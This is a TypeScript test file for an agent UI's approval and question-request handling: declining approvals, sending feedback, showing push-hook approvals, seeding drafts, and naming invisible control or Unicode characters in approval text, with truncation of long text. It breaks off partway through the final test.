import { presentThreadShell } from "./models.ts";
import { threadKey } from "./entities.ts";
import {
  EnvironmentId,
  EventId,
  MessageId,
  ThreadId,
  type ScopedThreadRef,
  NodeId,
  ProviderSessionId,
  RuntimeRequestId,
  TurnItemId,
  type OrchestrationV2ThreadProjection,
} from "@t3tools/contracts";
import { describe, expect, it, vi } from "vite-plus/test";
import { Atom, AtomRegistry, AsyncResult } from "effect/reactivity";
import * as Cause from "effect/Cause";
import { applyOrchestrationV2ProjectionEvent } from "./orchestrationV2Projection.ts";
import { v2Now, v2Projection, v2ThreadShell } from "./orchestrationV2TestFixtures.ts";
import {
  createQuestionHistoryProjector,
  createChildThreadApprovalsAtom,
  type PendingThreadRequests,
  derivePendingThreadRequests,
  APPROVAL_TEXT_LIMIT,
  approvalTextParts,
  declinePendingApprovals,
  sendApprovalFeedback,
  pushHooksApprovalRows,
  makeThreadRequestsResolvedAnnouncer,
  onThreadRequestsResolved,
  pruneResolvedUserInputDrafts,
  resolvedQuestionDraftKeys,
  seedUserInputDraftAnswers,
  userInputDraftKey,
  type ApprovalResponder,
  type ThreadRequestsResolved,
  type ThreadPendingApproval,
} from "./threadRequests.ts";

const requestId = RuntimeRequestId.make("async-question");
const nodeId = NodeId.make("async-question-node");

describe("declining approvals before sending", () => {
  const approval: ThreadPendingApproval = {
    requestId,
    requestKind: "command",
    createdAt: "2026-10-19T00:00:00Z",
    responseCapability: "live",
  };
  const second: ThreadPendingApproval = {
    ...approval,
    requestId: RuntimeRequestId.make("second-approval"),
  };

  it("declines every pending approval before the send continues", async () => {
    let resolve!: (value: Awaited<ReturnType<ApprovalResponder>>) => void;
    const firstResponse = new Promise<Awaited<ReturnType<ApprovalResponder>>>((done) => {
      resolve = done;
    });
    const respond = vi.fn<ApprovalResponder>(async (id) =>
      id === requestId ? firstResponse : AsyncResult.success(undefined),
    );
    const send = vi.fn();
    const submission = (async () => {
      if (await declinePendingApprovals([approval, second], respond)) send();
    })();
    expect(respond).toHaveBeenCalledWith(requestId, "decline");
    expect(send).not.toHaveBeenCalled();
    resolve(AsyncResult.success(undefined));
    await submission;
    expect(respond).toHaveBeenCalledWith(second.requestId, "decline");
    expect(send).toHaveBeenCalledOnce();
  });

  it.each([AsyncResult.failure(Cause.fail("decline failed")), undefined])(
    "does not send when a decline is unsuccessful: %s",
    async (response) => {
      const send = vi.fn();
      if (await declinePendingApprovals([approval], async () => response)) send();
      expect(send).not.toHaveBeenCalled();
    },
  );

  it("skips approvals the provider can no longer answer", async () => {
    const respond = vi.fn(async () => AsyncResult.success(undefined));
    expect(
      await declinePendingApprovals(
        [{ ...approval, responseCapability: "not_resumable" }],
        respond,
      ),
    ).toBe(true);
    expect(respond).not.toHaveBeenCalled();
  });

  it("sends feedback only to the displayed request, leaving other approvals pending", async () => {
    const respond = vi.fn<ApprovalResponder>(async () => AsyncResult.success(undefined));
    const pending = derivePendingThreadRequests({
      runtimeRequests: [
        {
          ...projection.runtimeRequests[0]!,
          kind: "command",
          responseCapability: {
            type: "live",
            providerSessionId: ProviderSessionId.make("claude-session"),
            supportsFeedback: true,
          },
        },
        { ...projection.runtimeRequests[0]!, id: second.requestId, kind: "command" },
      ],
      turnItems: [],
    });
    expect(await sendApprovalFeedback(pending.approvals[0]!, "  Safer please.  ", respond)).toBe(
      true,
    );
    expect(respond.mock.calls).toEqual([[approval.requestId, "decline", "Safer please."]]);
  });

  it("keeps feedback unsent when unsupported, stale, empty or rejected", async () => {
    const respond = vi.fn<ApprovalResponder>(async () => AsyncResult.failure(Cause.fail("failed")));
    expect(await sendApprovalFeedback(approval, "Safer please.", respond)).toBe(false);
    expect(
      await sendApprovalFeedback(
        { ...approval, supportsFeedback: true, responseCapability: "not_resumable" },
        "Safer please.",
        respond,
      ),
    ).toBe(false);
    expect(await sendApprovalFeedback({ ...approval, supportsFeedback: true }, "  ", respond)).toBe(
      false,
    );
    expect(respond).not.toHaveBeenCalled();
    expect(
      await sendApprovalFeedback({ ...approval, supportsFeedback: true }, "Safer please.", respond),
    ).toBe(false);
  });
});

describe("a push hooks approval", () => {
  const pushHooks = {
    branch: "feature/greeting",
    files: [".husky/pre-push"],
    commands: [{ name: "checks", command: "pnpm run checks" }],
  };
  const pending = (item: { readonly pushHooks: typeof pushHooks } | { readonly appName: string }) =>
    derivePendingThreadRequests({
      runtimeRequests: [{ ...projection.runtimeRequests[0]!, kind: "mcp-elicitation" }],
      turnItems: [
        {
          id: TurnItemId.make("push-hooks-approval-item"),
          threadId: v2Projection.thread.id,
          runId: null,
          nodeId,
          providerThreadId: null,
          providerTurnId: null,
          nativeItemRef: null,
          parentItemId: null,
          ordinal: 0,
          status: "waiting",
          title: null,
          startedAt: v2Now,
          completedAt: null,
          updatedAt: v2Now,
          type: "approval_request",
          requestId,
          requestKind: "mcp-elicitation",
          prompt: "Push feature/greeting and run this repository's hook file .husky/pre-push?",
          ...item,
        },
      ],
    }).approvals[0]!;

  it("carries what T3 Code names and no app, and another server's request its app", () => {
    const own = pending({ pushHooks });
    expect(own.pushHooks).toEqual(pushHooks);
    expect(own).not.toHaveProperty("appName");
    expect(own.detail).toBe(
      "Push feature/greeting and run this repository's hook file .husky/pre-push?",
    );

    const other = pending({ appName: "deploys" });
    expect(other.appName).toBe("deploys");
    expect(other).not.toHaveProperty("pushHooks");
  });

  it("lists the branch, then each hook file and configured hook", () => {
    expect(pushHooksApprovalRows(pushHooks)).toEqual([
      { label: "Branch", code: "feature/greeting" },
      { label: "Hook file", code: ".husky/pre-push" },
      { label: "Configured hook", name: "checks", code: "pnpm run checks" },
    ]);
  });
});

describe("pruning resolved user input drafts", () => {
  const answered = userInputDraftKey("env", "thread", "answered");
  const pending = userInputDraftKey("env", "thread", "pending");
  const otherThread = userInputDraftKey("env", "thread-2", "answered");
  const otherEnvironment = userInputDraftKey("env-2", "thread", "answered");
  const drafts = {
    [answered]: 1,
    [pending]: 2,
    [otherThread]: 3,
    [otherEnvironment]: 4,
  };

  it("drops only the thread's requests that are no longer pending", () => {
    expect(pruneResolvedUserInputDrafts(drafts, "env", "thread", ["pending"])).toEqual({
      [pending]: 2,
      [otherThread]: 3,
      [otherEnvironment]: 4,
    });
  });

  it("returns the same record when nothing resolved", () => {
    expect(pruneResolvedUserInputDrafts(drafts, "env", "thread", ["answered", "pending"])).toBe(
      drafts,
    );
  });
});

describe("resolved question draft keys", () => {
  const prefix = "env:question-thread-";
  const key = (request: string, question: string) =>
    `${prefix}${encodeURIComponent(JSON.stringify([request, question]))}`;

  it("returns the thread's keys for requests that are no longer pending", () => {
    const keys = [
      key("pending", "first"),
      key("pending", "second"),
      key("pending-2", "first"),
      key("answered", "first"),
      "env:question-other-thread-x",
    ];
    expect(resolvedQuestionDraftKeys(keys, prefix, [RuntimeRequestId.make("pending")])).toEqual([
      key("pending-2", "first"),
      key("answered", "first"),
    ]);
  });
});

describe("announcing resolved thread requests", () => {
  const environmentId = EnvironmentId.make("env");
  const threadId = v2Projection.thread.id;
  const first = RuntimeRequestId.make("first");
  const second = RuntimeRequestId.make("second");

  function record() {
    const events: ThreadRequestsResolved[] = [];
    const unsubscribe = onThreadRequestsResolved((event) => events.push(event));
    return { events, [Symbol.dispose]: unsubscribe };
  }

  it("announces the first projection, then only when a request leaves pending", () => {
    using recorder = record();
    const announce = makeThreadRequestsResolvedAnnouncer(environmentId, threadId);

    const pending = (id: RuntimeRequestId) => ({ id, status: "pending" as const });
    announce([pending(first)]);
    announce([pending(first), pending(second)]);
    announce([pending(first), pending(second)]);
    announce([{ id: first, status: "cancelled" }, pending(second)]);
    announce([
      { id: first, status: "cancelled" },
      { id: second, status: "resolved" },
    ]);

    expect(recorder.events).toEqual([
      { environmentId, threadId, pendingRequestIds: [first], unansweredRequestIds: [] },
      { environmentId, threadId, pendingRequestIds: [second], unansweredRequestIds: [first] },
      { environmentId, threadId, pendingRequestIds: [], unansweredRequestIds: [first] },
    ]);
  });
});

describe("initial user input drafts", () => {
  const questions = [
    { id: "editor", initialAnswer: "  Proposed commit\n\n" },
    { id: "empty", initialAnswer: "" },
    { id: "ordinary" },
    { id: "choices", initialAnswer: "Ignore this", allowCustomAnswer: false },
  ];

  it("seeds editable answers and preserves edits and selections on later snapshots", () => {
    const seeded = seedUserInputDraftAnswers(questions, {});
    expect(seeded).toEqual({
      editor: { customAnswer: "  Proposed commit\n\n" },
      empty: { customAnswer: "" },
    });
    const edits = {
      ...seeded,
      editor: { customAnswer: "" },
      empty: { selectedOptionValues: ["empty"], customAnswer: "" },
    };
    expect(seedUserInputDraftAnswers(questions, edits)).toEqual(edits);
    expect(
      seedUserInputDraftAnswers(questions, { editor: { customAnswer: "Edited commit" } }).editor,
    ).toEqual({ customAnswer: "Edited commit" });
    expect(seedUserInputDraftAnswers(questions, {}).editor).toEqual({
      customAnswer: "  Proposed commit\n\n",
    });
  });

  it("seeds a question with the id __proto__ as its own draft", () => {
    const seeded = seedUserInputDraftAnswers(
      [
        { id: "__proto__", initialAnswer: "Proposed" },
        { id: "name", initialAnswer: "Control" },
      ],
      {},
    );

    expect(JSON.stringify(seeded)).toBe(
      '{"__proto__":{"customAnswer":"Proposed"},"name":{"customAnswer":"Control"}}',
    );
  });
});
const projection: OrchestrationV2ThreadProjection = {
  ...v2Projection,
  runtimeRequests: [
    {
      id: requestId,
      nodeId,
      providerTurnId: null,
      nativeRequestRef: null,
      kind: "user_input",
      status: "pending",
      responseCapability: { type: "message" },
      createdAt: v2Now,
      resolvedAt: null,
    },
  ],
  turnItems: [
    {
      id: TurnItemId.make("async-question-item"),
      threadId: v2Projection.thread.id,
      runId: null,
      nodeId,
      providerThreadId: null,
      providerTurnId: null,
      nativeItemRef: null,
      parentItemId: null,
      ordinal: 0,
      status: "completed",
      title: null,
      startedAt: v2Now,
      completedAt: v2Now,
      updatedAt: v2Now,
      type: "user_input_request",
      requestId,
      responseMode: "message",
      questions: [
        {
          id: "next",
          header: "Next",
          question: "What should happen next?",
          required: true,
          allowCustomAnswer: false,
          options: [{ label: "Continue", value: "  continue  ", description: "Resume work" }],
        },
      ],
    },
  ],
};

describe("pending v2 questions", () => {
  it("keeps message responses available after the originating runtime exits", () => {
    expect(projection.providerSessions).toEqual([]);
    expect(derivePendingThreadRequests(projection).userInputs).toEqual([
      {
        requestId,
        createdAt: "2026-06-20T00:00:00.000Z",
        responseCapability: "message",
        responseMode: "message",
        dismissible: true,
        questions: [
          {
            id: "next",
            header: "Next",
            question: "What should happen next?",
            required: true,
            allowCustomAnswer: false,
            multiSelect: false,
            options: [{ label: "Continue", value: "  continue  ", description: "Resume work" }],
          },
        ],
      },
    ]);
  });

  it("only marks asynchronous questions as dismissible", () => {
    const live = {
      ...projection,
      runtimeRequests: projection.runtimeRequests.map((request) => ({
        ...request,
        responseCapability: {
          type: "live" as const,
          providerSessionId: ProviderSessionId.make("live-session"),
        },
      })),
      turnItems: projection.turnItems.map((item) =>
        item.type === "user_input_request" ? { ...item, responseMode: undefined } : item,
      ),
    };
    expect(derivePendingThreadRequests(live).userInputs[0]?.dismissible).toBe(false);
  });
});

it("restores old text answers without mutating history or replacing unchanged rows", () => {
  const project = createQuestionHistoryProjector();
  const item = projection.turnItems[0]!;
  const row = {
    item,
    position: 0,
    sourceItemId: item.id,
    sourceThreadId: item.threadId,
    visibility: "local" as const,
  };
  const rows = [row];
  const pending = { visibleTurnItems: rows, runtimeRequests: projection.runtimeRequests };
  expect(project(pending)).toBe(rows);
  const answered = {
    ...pending,
    runtimeRequests: [
      {
        ...projection.runtimeRequests[0]!,
        status: "resolved" as const,
        answers: { next: "Continue" },
      },
    ],
  };
  const result = project(answered);
  expect(result[0]?.item).toMatchObject({
    questionAnswer: {
      answers: { next: "Continue" },
      attachmentsByQuestionId: {},
      questionTextById: { next: "What should happen next?" },
    },
  });
  expect(row.item).not.toHaveProperty("questionAnswer");
  expect(project(answered)).toBe(result);
  expect(project({ ...answered, visibleTurnItems: [...rows] })[0]).toBe(result[0]);
});

type QuestionItem = Extract<
  OrchestrationV2ThreadProjection["turnItems"][number],
  { readonly type: "user_input_request" }
>;

describe("question history through exact row replacements", () => {
  const baseItem = {
    threadId: v2Projection.thread.id,
    runId: null,
    nodeId,
    providerThreadId: null,
    providerTurnId: null,
    nativeItemRef: null,
    parentItemId: null,
    status: "running" as const,
    title: null,
    startedAt: v2Now,
    completedAt: null,
    updatedAt: v2Now,
  };
  const assistantItem = (ordinal: number, text = "Hel") => ({
    ...baseItem,
    id: TurnItemId.make(`assistant-${ordinal}`),
    ordinal,
    type: "assistant_message" as const,
    messageId: MessageId.make(`message-${ordinal}`),
    text,
    streaming: true,
  });
  const localRow = (
    item: OrchestrationV2ThreadProjection["turnItems"][number],
    position: number,
  ) => ({
    item,
    position,
    sourceItemId: item.id,
    sourceThreadId: item.threadId,
    visibility: "local" as const,
  });
  const updated = (
    current: OrchestrationV2ThreadProjection,
    item: OrchestrationV2ThreadProjection["turnItems"][number],
  ) =>
    applyOrchestrationV2ProjectionEvent(current, {
      id: EventId.make(`event-${item.id}`),
      type: "turn-item.updated",
      threadId: current.thread.id,
      occurredAt: v2Now,
      payload: item,
    })!;

  it("reads only the replaced row and leaves the request index alone", () => {
    const size = 1_000;
    const counts = { items: 0, requestIds: 0 };
    const items = Array.from({ length: size }, (_, index) => assistantItem(index));
    const countedRows = items.map((item, index) => {
      const row = localRow(item, index);
      return Object.defineProperty(row, "item", {
        enumerable: true,
        get: () => {
          counts.items += 1;
          return item;
        },
      });
    });
    const countedRequests = Array.from({ length: 400 }, (_, index) => {
      const request = {
        ...projection.runtimeRequests[0]!,
        id: RuntimeRequestId.make(`request-${index}`),
      };
      return Object.defineProperty(request, "id", {
        enumerable: true,
        get: () => {
          counts.requestIds += 1;
          return RuntimeRequestId.make(`request-${index}`);
        },
      });
    });
    const initial: OrchestrationV2ThreadProjection = {
      ...v2Projection,
      turnItems: items,
      visibleTurnItems: countedRows,
      runtimeRequests: countedRequests,
    };
    const project = createQuestionHistoryProjector();
    const scan = (current: OrchestrationV2ThreadProjection) => {
      counts.items = 0;
      counts.requestIds = 0;
      const result = project(current);
      return { result, ...counts };
    };
    expect(scan(initial)).toMatchObject({ items: size, requestIds: 400 });

    const adjacent = updated(initial, assistantItem(size - 1, "Hello"));
    const hinted = scan(adjacent);
    expect(hinted.result).toBe(adjacent.visibleTurnItems);
    expect(hinted).toMatchObject({ items: 0, requestIds: 0 });

    // A skipped delta has no hint for this exact pair, so it scans again.
    const skipped = updated(
      updated(adjacent, assistantItem(size - 1, "Hello t")),
      assistantItem(size - 1, "Hello there"),
    );
    const fallback = scan(skipped);
    expect(fallback.result).toBe(skipped.visibleTurnItems);
    expect(fallback).toMatchObject({ items: size - 1, requestIds: 0 });
  });

  it("matches a full projection through streamed rows, request changes and answers", () => {
    const question = projection.turnItems[0] as QuestionItem;
    const resolved = (answers: Record<string, string>) => ({
      ...projection.runtimeRequests[0]!,
      status: "resolved" as const,
      answers,
    });
    const explicitRequestId = RuntimeRequestId.make("explicit-question");
    const explicitAnswer = {
      requestId: explicitRequestId,
      answers: { next: "Explicit" },
      attachmentsByQuestionId: {},
      questionTextById: { next: "What should happen next?" },
    };
    const unanswered: QuestionItem = {
      ...question,
      id: TurnItemId.make("explicit-question-item"),
      ordinal: 1,
      requestId: explicitRequestId,
    };
    const explicit: QuestionItem = { ...unanswered, questionAnswer: explicitAnswer };
    const explicitRequest = {
      ...resolved({ next: "From request" }),
      id: explicitRequestId,
    };
    const stream = assistantItem(2);
    const inherited = {
      ...localRow({ ...question, id: TurnItemId.make("inherited-question-item") }, 3),
      visibility: "inherited" as const,
      sourceThreadId: ThreadId.make("parent-thread"),
    };
    const turnItems = [question, explicit, stream];
    let current: OrchestrationV2ThreadProjection = {
      ...v2Projection,
      turnItems,
      visibleTurnItems: [...turnItems.map(localRow), inherited],
      runtimeRequests: [projection.runtimeRequests[0]!, explicitRequest],
    };
    const project = createQuestionHistoryProjector();
    const step = (next: OrchestrationV2ThreadProjection) => {
      current = next;
      const result = project(next);
      expect(result).toEqual(createQuestionHistoryProjector()(next));
      return result;
    };
    const answerOf = (rows: ReadonlyArray<{ readonly item: unknown }>, index: number) =>
      (rows[index]!.item as { readonly questionAnswer?: { readonly answers: unknown } })
        .questionAnswer?.answers;

    expect(step(current)).toBe(current.visibleTurnItems);
    expect(step(updated(current, assistantItem(2, "Hello")))).toBe(current.visibleTurnItems);

    // The last duplicate request wins, and every row asking it gets the answer.
    const answered = step({
      ...current,
      runtimeRequests: [
        projection.runtimeRequests[0]!,
        resolved({ next: "Continue" }),
        explicitRequest,
      ],
    });
    expect(answerOf(answered, 0)).toEqual({ next: "Continue" });
    expect(answerOf(answered, 1)).toEqual({ next: "Explicit" });
    expect(answerOf(answered, 3)).toEqual({ next: "Continue" });

    const whileOverlaid = step(updated(current, assistantItem(2, "Hello there")));
    expect(whileOverlaid[0]).toBe(answered[0]);
    expect(whileOverlaid[3]).toBe(answered[3]);

    const changedAnswer = step({
      ...current,
      runtimeRequests: [resolved({ next: "Stop" }), explicitRequest],
    });
    expect(answerOf(changedAnswer, 0)).toEqual({ next: "Stop" });

    const reopened = step({
      ...current,
      runtimeRequests: [projection.runtimeRequests[0]!, explicitRequest],
    });
    expect(reopened).toBe(current.visibleTurnItems);

    // Dropping an explicit answer falls back to its resolved request.
    const restored = step(updated(current, unanswered));
    expect(answerOf(restored, 1)).toEqual({ next: "From request" });

    const retitled: QuestionItem = {
      ...unanswered,
      questions: [{ ...question.questions[0]!, question: "Now what?" }],
    };
    const retitledRows = step(updated(current, retitled));
    expect(retitledRows[1]!.item).toMatchObject({
      questionAnswer: { questionTextById: { next: "Now what?" } },
    });
  });
});

it("loads only child approvals and retains their destination across environments", () => {
  const local = EnvironmentId.make("local");
  const remote = EnvironmentId.make("remote");
  const parent = { environmentId: local, threadId: ThreadId.make("parent") };
  const childId = ThreadId.make("child");
  const children = Atom.make(
    [local, remote].map((environmentId) => ({
      ...presentThreadShell(environmentId, v2ThreadShell),
      id: childId,
      title: environmentId,
      hasPendingApprovals: true,
    })),
  );
  const details = Atom.family((key: string) =>
    Atom.make<PendingThreadRequests | null>({
      approvals: [
        {
          requestId: RuntimeRequestId.make(key),
          requestKind: "command",
          createdAt: "2026-10-19T00:00:00Z",
          responseCapability: "live",
        },
      ],
      userInputs: [],
    }),
  );
  const readDetails = vi.fn((ref: ScopedThreadRef) => details(threadKey(ref)));
  const approvalsAtom = createChildThreadApprovalsAtom({
    childThreadInputsAtom: () => children,
    pendingRequestsAtom: readDetails,
  });
  const registry = AtomRegistry.make();
  const unmount = registry.mount(approvalsAtom(parent));
  const pending = registry.get(approvalsAtom(parent));
  expect(pending.map((entry) => entry.thread)).toEqual(
    [local, remote].map((environmentId) => ({ environmentId, threadId: childId })),
  );
  expect(pending.map((entry) => entry.title)).toEqual(["local", "remote"]);
  registry.set(details(threadKey({ environmentId: remote, threadId: childId })), {
    approvals: [],
    userInputs: [],
  });
  expect(registry.get(approvalsAtom(parent))).toEqual([pending[0]]);
  readDetails.mockClear();
  registry.set(
    children,
    registry
      .get(children)
      .map((child) => ({ ...child, hasPendingApprovals: false, hasPendingUserInput: true })),
  );
  expect(registry.get(approvalsAtom(parent))).toEqual([]);
  expect(readDetails).not.toHaveBeenCalled();
  unmount();
  registry.dispose();
});

it("names the characters of an approval that a screen would not draw", () => {
  const named = (text: string) =>
    approvalTextParts(text)
      .parts.map((part) => (part.named ? `<${part.text}>` : part.text))
      .join("");
  expect(named("echo one\rtwo\r\n\tthree")).toBe("echo one<\\r>two<\\r>\n\tthree");
  expect(named("a\b\u001B[2K\u0000\u007F\u0085\u000B\u000C")).toBe(
    "a<\\b\\e>[2K<U+0000U+007FU+0085U+000BU+000C>",
  );
  expect(named("a b c‮d⁧e​f‍g\u{E0072}")).toBe(
    "a<U+2028>b<U+2029>c<U+202E>d<U+2067>e<U+200B>f<U+200D>g<U+E0072>",
  );
  expect(named("a︀ a\u{E0100} é͏ ㅤ a᠋ ᠎ ؜")).toBe(
    "a<U+FE00> a<U+E0100> é<U+034F> <U+3164> a<U+180B> <U+180E> <U+061C>",
  );
  // Every drawn character stays: plain text, accents, a line feed and a tab.
  const drawn = "git commit -m 'café é 漢字 نمی'\n\tgit push";
  expect(approvalTextParts(drawn).parts).toEqual([{ text: drawn }]);
  expect(approvalTextParts("")).toEqual({
    parts: [],
    tail: [],
    shownLength: 0,
    hiddenLength: 0,
    length: 0,
  });
});

it("leaves a joiner or a presentation selector alone only inside an emoji", () => {
  const named = (text: string) =>
    approvalTextParts(text)
      .parts.map((part) => (part.named ? `<${part.text}>` : part.text))
      .join("");
  const unchanged = (text: string) => expect(approvalTextParts(text).parts).toEqual([{ text }]);

  // A joiner directly between two emoji, after the first one's selector or skin tone too.
  unchanged("\u{1F469}‍\u{1F4BB} \u{1F9D1}\u{1F3FD}‍\u{1F4BB} \u{1F44B}\u{1F3FD}");
  unchanged("\u{1F3F3}️‍\u{1F308} \u{1F441}️‍\u{1F5E8}️");
  // A presentation selector directly after an emoji or in a keycap.
  unchanged("❤️ ❤︎ 1️⃣ #️⃣");

  // The same characters anywhere else, in every script.
  expect(named("نمی‌خواهم ه‍")).toBe("نمی<U+200C>خواهم ه<U+200D>");
  expect(named("क्‍ष क्‌ष")).toBe("क्<U+200D>ष क्<U+200C>ष");
  expect(named("ᠮ᠋ 葛\u{E0100} 辻︀")).toBe("ᠮ<U+180B> 葛<U+E0100> 辻<U+FE00>");
  expect(named("cat 'safe—‍.txt' é‍x ‍a‍")).toBe(
    "cat 'safe—<U+200D>.txt' é<U+200D>x <U+200D>a<U+200D>",
  );
  expect(named("a️b︎ 1️ 1︎⃣ 漢️ ️")).toBe("a<U+FE0F>b<U+FE0E> 1<U+FE0F> 1<U+FE0E>⃣ 漢<U+FE0F> <U+FE0F>");
  // An emoji on one side only, a non-joiner, and a second joiner or selector.
  expect(named("\u{1F469}‍.txt x‍\u{1F4BB} \u{1F469}‌\u{1F4BB} \u{1F469}‍")).toBe(
    "\u{1F469}<U+200D>.txt x<U+200D>\u{1F4BB} \u{1F469}<U+200C>\u{1F4BB} \u{1F469}<U+200D>",
  );
  expect(named("\u{1F469}‍‍\u{1F4BB} ❤️️")).toBe("\u{1F469}<U+200DU+200D>\u{1F4BB} ❤️<U+FE0F>");
  // A skin tone is a drawn character, not an emoji to join or to select a presentation of.
  expect(named("a\u{1F3FD}‍\u{1F4BB} \u{1F469}‍\u{1F3FD} \u{1F44B}\u{1F3FD}️")).toBe(
    "a\u{1F3FD}<U+200D>\u{1F4BB} \u{1F469}<U+200D>\u{1F3FD} \u{1F44B}\u{1F3FD}<U+FE0F>",
  );
  // A code point reserved for an emoji that does not exist yet is not an emoji.
  expect(named("\u{1FC00}\uFE0F \u{1FC00}\u200D\u{1F4BB} \u{1F469}\u200D\u{1FC00}")).toBe(
    "\u{1FC00}<U+FE0F> \u{1FC00}<U+200D>\u{1F4BB} \u{1F469}<U+200D>\u{1FC00}",
  );
  // Tag characters are named, in a flag as well.
  expect(named("\u{1F3F4}\u{E0067}\u{E0062}\u{E007F}")).toBe("\u{1F3F4}<U+E0067U+E0062U+E007F>");
});

it("merges named characters that stand together into one part", () => {
  expect(approvalTextParts("a\r\r\u200Db\u001B\nc\b").parts).toEqual([
    { text: "a" },
    { text: "\\r\\rU+200D", named: true },
    { text: "b" },
    { text: "\\e", named: true },
    { text: "\nc" },
    { text: "\\b", named: true },
  ]);
  // A joiner inside an emoji is not named and ends the run before it.
  expect(approvalTextParts("\r\u{1F469}\u200D\u{1F4BB}\u200D\r").parts).toEqual([
    { text: "\\r", named: true },
    { text: "\u{1F469}\u200D\u{1F4BB}" },
    { text: "U+200D\\r", named: true },
  ]);
});

it("shows the beginning and the end of approval text that passes its limit", () => {
  const limit = { length: 8, namedRuns: 2, tailLength: 3, tailNamedRuns: 1 };
  const read = (parts: ReadonlyArray<{ text: string; named?: true }>) =>
    parts.map((part) => (part.named ? `<${part.text}>` : part.text)).join("");
  const scan = (text: string) => {
    const { parts, tail, hiddenLength } = approvalTextParts(text, limit);
    return [read(parts), hiddenLength, read(tail)];
  };
  // Under the limit or at it, all of the text.
  expect(scan("abcdefg")).toEqual(["abcdefg", 0, ""]);
  expect(scan("abcdefgh")).toEqual(["abcdefgh", 0, ""]);
  expect(scan("a\r\rb\rc")).toEqual(["a<\\r\\r>b<\\r>c", 0, ""]);
  // Over it, the beginning and the end, which together are as long as the limit.
  expect(scan("abcdefghi")).toEqual(["abcde", 1, "ghi"]);
  expect(scan("abcdefghijklmnop sh x")).toEqual(["abcde", 13, "h x"]);
  // Neither cut falls inside a code point.
  expect(scan("abcd\u{1F469}fgh")).toEqual(["abcd", 2, "fgh"]);
  expect(scan("abcdefg\u{1F469}h")).toEqual(["abcde", 2, "\u{1F469}h"]);
  expect(scan("abcdef\u{1F469}hi")).toEqual(["abcde", 3, "hi"]);
  // Characters in the end are named like those in the beginning, and its runs are the last ones.
  expect(scan("abcdefg\r‮")).toEqual(["abcde", 1, "g<\\rU+202E>"]);
  expect(scan("abcdefg\ra\r")).toEqual(["abcde", 3, "a<\\r>"]);
  // Past the runs of the beginning, the text up to the next run and then the end.
  expect(scan("\ra\rb\rcde")).toEqual(["<\\r>a<\\r>b", 1, "cde"]);
  // An end that starts where the beginning stopped leaves nothing out, so the text is whole.
  expect(scan("a\rb\rc\rd")).toEqual(["a<\\r>b<\\r>c<\\r>d", 0, ""]);

  // Whatever the length, the two parts are the two ends of the text and no code point is split.
  const unit = "a\u{1F469}bc\u{1F4BB}";
  for (let length = 0; length <= 3 * unit.length; length += 1) {
    const text = unit
      .repeat(3)
      .slice(0, length)
      .replace(/[\uD800-\uDBFF]$/, "");
    const { parts, tail, shownLength, hiddenLength } = approvalTextParts(text, limit);
    expect(read(parts)).toBe(text.slice(0, shownLength));
    expect(read(tail)).toBe(hiddenLength > 0 ? text.slice(shownLength + hiddenLength) : "");
    expect(hiddenLength > 0).toBe(text.length > limit.length);
    expect(`${read(parts)}|${read(tail)}`).not.toMatch(/\p{Cs}/u);
  }
});

it("names a character a screen would not draw wherever it stands, the very end included", () => {
  const read = (parts: ReadonlyArray<{ text: string; named?: true }>) =>
    parts.map((part) => (part.named ? `<${part.text}>` : part.text)).join("");
  const whole = (text: string) => {
    const scan = approvalTextParts(text);
    expect([scan.tail, scan.hiddenLength, scan.shownLength]).toEqual([[], 0, text.length]);
    return read(scan.parts);
  };
  expect(whole("ls\r")).toBe("ls<\\r>");
  expect(whole("ls\r\n")).toBe("ls<\\r>\n");
  expect(whole("ls\n\r")).toBe("ls\n<\\r>");
  expect(whole("ls\u200D")).toBe("ls<U+200D>");
  // Text made only of such characters is one named part.
  expect(whole("\r")).toBe("<\\r>");
  expect(approvalTextParts("\r\u200D\u001B\r").parts).toEqual([
    { text: "\\rU+200D\\e\\r", named: true },
  ]);

  // The same where long text is cut: 5 units of beginning, 3 of end.
  const limit = { length: 8, namedRuns: 2, tailLength: 3, tailNamedRuns: 1 };
  const cut = (text: string) => {
    const { parts, tail, hiddenLength } = approvalTextParts(text, limit);
    return [read(parts), hiddenLength, read(tail)];
  };
  // The last unit of the text.
  expect(cut("abcdefgh\r")).toEqual(["abcde", 1, "gh<\\r>"]);
  expect(cut("abcdefg\r\n")).toEqual(["abcde", 1, "g<\\r>\n"]);
  expect(cut("abcdefg\n\r")).toEqual(["abcde", 1, "g\n<\\r>"]);
  expect(cut("abcdefgh\u200D")).toEqual(["abcde", 1, "gh<U+200D>"]);
  // The last unit of the beginning and the first unit of the end.
  expect(cut("abcd\rfghi")).toEqual(["abcd<\\r>", 1, "ghi"]);
  expect(cut("abcd\u200Dfghi")).toEqual(["abcd<U+200D>", 1, "ghi"]);
  expect(cut("abcdef\rhi")).toEqual(["abcde", 1, "<\\r>hi"]);
  expect(cut("abcdef\u200Dhi")).toEqual(["abcde", 1, "<U+200D>hi"]);
  // A joiner the cut parts from its emoji is named on the side it stays on.
  expect(cut("ab\u{1F469}\u200D\u{1F4BB}xyz")).toEqual(["ab\u{1F469}<U+200D>", 2, "xyz"]);
  expect(cut("abcd\u{1F469}\u200D\u{1F4BB}")).toEqual(["abcd", 2, "<U+200D>\u{1F4BB}"]);
  // Only such characters, in the whole text or in its end.
  expect(cut("\r".repeat(9))).toEqual(["<\\r\\r\\r\\r\\r>", 1, "<\\r\\r\\r>"]);
  expect(cut("abcdefghi\r\u200D\r")).toEqual(["abcde", 4, "<\\rU+200D\\r>"]);

  // At every length, short or cut, the last thing shown is the name of the last character.
  for (const [end, name] of [
    ["\r", "<\\r>"],
    ["\r\n", "<\\r>\n"],
    ["\n\r", "\n<\\r>"],
    ["\u200D", "<U+200D>"],
  ] as const) {
    for (let length = 0; length <= 20; length += 1) {
      const scan = approvalTextParts("x".repeat(length) + end, limit);
      expect(read(scan.hiddenLength > 0 ? scan.tail : scan.parts).endsWith(name)).toBe(true);
    }
    const long = approvalTextParts("x".repeat(APPROVAL_TEXT_LIMIT.length) + end);
    expect(long.hiddenLength).toBe(end.length);
    expect(read(long.tail).endsWith(name)).toBe(true);
  }
});

it("bounds the parts of a megabyte of approval text and still shows what it ends with", () => {
  const { length, namedRuns, tailLength, tailNamedRuns } = APPROVAL_TEXT_LIMIT;
  const size = 1 << 20;
  const count = (text: string) => {
    const { parts, tail, shownLength, hiddenLength } = approvalTextParts(text);
    return [
      [parts.length, parts.filter((part) => part.named).length, shownLength],
      [tail.length, tail.filter((part) => part.named).length],
      hiddenLength,
    ];
  };
  // Just under the limit, at it and just over it.
  expect(count("a".repeat(length - 1))).toEqual([[1, 0, length - 1], [0, 0], 0]);
